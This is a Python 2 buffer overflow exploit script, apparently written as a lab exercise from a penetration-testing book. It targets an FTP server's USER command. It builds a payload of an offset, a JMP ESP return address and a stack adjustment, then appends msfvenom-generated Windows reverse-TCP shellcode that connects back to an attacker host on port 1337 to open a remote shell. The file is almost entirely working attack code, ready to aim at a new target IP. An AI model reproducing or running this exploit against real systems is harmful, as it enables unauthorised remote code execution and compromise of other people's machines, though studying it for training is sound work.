# Basic buffer overflow exploit created by mattia Campagnano on May 3, 2020
# following Georgia Weidman's book "Pentesting.A Hands-on Introduction to Hacking"


#!/usr/bin/python
import socket

# Shellcode created through the following command:
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.89 LPORT=1337 -b "\x00\x20\x0a\x0d\x40" -f c -a x86 --platform windows

shellcode=("\xbb\x97\x53\x8e\xb3\xda\xdd\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xc0\x04\x31\x58\x0e\x03\xcf\x5d\x6c\x46\x13\x89\xf2"
"\xa9\xeb\x4a\x93\x20\x0e\x7b\x93\x57\x5b\x2c\x23\x13\x09\xc1"
"\xc8\x71\xb9\x52\xbc\x5d\xce\xd3\x0b\xb8\xe1\xe4\x20\xf8\x60"
"\x67\x3b\x2d\x42\x56\xf4\x20\x83\x9f\xe9\xc9\xd1\x48\x65\x7f"
"\xc5\xfd\x33\xbc\x6e\x4d\xd5\xc4\x93\x06\xd4\xe5\x02\x1c\x8f"
"\x25\xa5\xf1\xbb\x6f\xbd\x16\x81\x26\x36\xec\x7d\xb9\x9e\x3c"
"\x7d\x16\xdf\xf0\x8c\x66\x18\x36\x6f\x1d\x50\x44\x12\x26\xa7"
"\x36\xc8\xa3\x33\x90\x9b\x14\x9f\x20\x4f\xc2\x54\x2e\x24\x80"
"\x32\x33\xbb\x45\x49\x4f\x30\x68\x9d\xd9\x02\x4f\x39\x81\xd1"
"\xee\x18\x6f\xb7\x0f\x7a\xd0\x68\xaa\xf1\xfd\x7d\xc7\x58\x6a"
"\xb1\xea\x62\x6a\xdd\x7d\x11\x58\x42\xd6\xbd\xd0\x0b\xf0\x3a"
"\x16\x26\x44\xd4\xe9\xc9\xb5\xfd\x2d\x9d\xe5\x95\x84\x9e\x6d"
"\x65\x28\x4b\x21\x35\x86\x24\x82\xe5\x66\x95\x6a\xef\x68\xca"
"\x8b\x10\xa3\x63\x21\xeb\x24\x4c\x1e\xf2\xed\x24\x5d\xf4\x08"
"\x8c\xe8\x12\x78\xfe\xbc\x8d\x15\x67\xe5\x45\x87\x68\x33\x20"
"\x87\xe3\xb0\xd5\x46\x04\xbc\xc5\x3f\xe4\x8b\xb7\x96\xfb\x21"
"\xdf\x75\x69\xae\x1f\xf3\x92\x79\x48\x54\x64\x70\x1c\x48\xdf"
"\x2a\x02\x91\xb9\x15\x86\x4e\x7a\x9b\x07\x02\xc6\xbf\x17\xda"
"\xc7\xfb\x43\xb2\x91\x55\x3d\x74\x48\x14\x97\x2e\x27\xfe\x7f"
"\xb6\x0b\xc1\xf9\xb7\x41\xb7\xe5\x06\x3c\x8e\x1a\xa6\xa8\x06"
"\x63\xda\x48\xe8\xbe\x5e\x78\xa3\xe2\xf7\x11\x6a\x77\x4a\x7c"
"\x8d\xa2\x89\x79\x0e\x46\x72\x7e\x0e\x23\x77\x3a\x88\xd8\x05"
"\x53\x7d\xde\xba\x54\x54")

# buffer=offset+return address where a JMP ESP was found + 4 Cs + padding to 
# avoid corruption (address resulting from add esp, -1500) + shellcode

buffer = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + "\x81\xc4\x24\xfa\xff\xff"+shellcode

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 

#The target IP address might have to be changed to fit your specific case

connect=s.connect(('192.168.1.61',21)) 
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
